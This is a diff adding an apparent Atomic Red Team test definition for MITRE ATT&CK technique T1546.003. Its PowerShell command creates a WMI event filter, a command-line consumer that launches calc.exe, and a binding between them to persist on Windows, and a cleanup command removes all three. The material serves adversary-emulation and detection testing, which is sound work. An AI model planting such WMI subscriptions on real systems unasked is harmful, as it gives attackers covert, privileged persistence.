@@ -1,0 +1,26 @@
+attack_technique: T1546.003
+display_name: WMI Filter, Consumer, and FilterToConsumer for Persistence
+atomic_tests:
+- name: WMI Filter, Consumer, and FilterToConsumer for Persistence
+  auto_generated_guid: 3acb08bf-1ba5-4a45-9f2b-3b10b957147a
+  description: |
+    WMI events are made up of 3 key pieces:
+    Event Filters** - conditions that the system will listen for 
+    Event Consumers** - consumers can carry out actions when event filters are triggered 
+    filter to consumer bindings** - the gluing matter that marries event filters and event consumers together for the event consumers to get invoked.
+    WMI Events can be used by threat actors for persistence
+
+  supported_platforms:
+  - windows
+  
+  executor:
+    elevation_required: true
+    name: powershell
+    command: |
+      $newly_created_filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{name='New-Filter';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200"};
+      $newly_created_consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{name='New-Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\calc.exe";}
+      $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter = [Ref] $newly_created_filter;Consumer = [Ref] $newly_created_consumer;}
+    cleanup_command: |
+      Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object {$_.Filter -eq $newly_created_filter -and $_.Consumer -eq $newly_created_consumer} | Remove-CimInstance
+      Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer | Where-Object {$_.CimInstanceProperties['name'].Value -eq 'New-Consumer'} | Remove-CimInstance
+      Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | Where-Object {$_.CimInstanceProperties['name'].Value -eq 'New-Filter'} | Remove-CimInstance
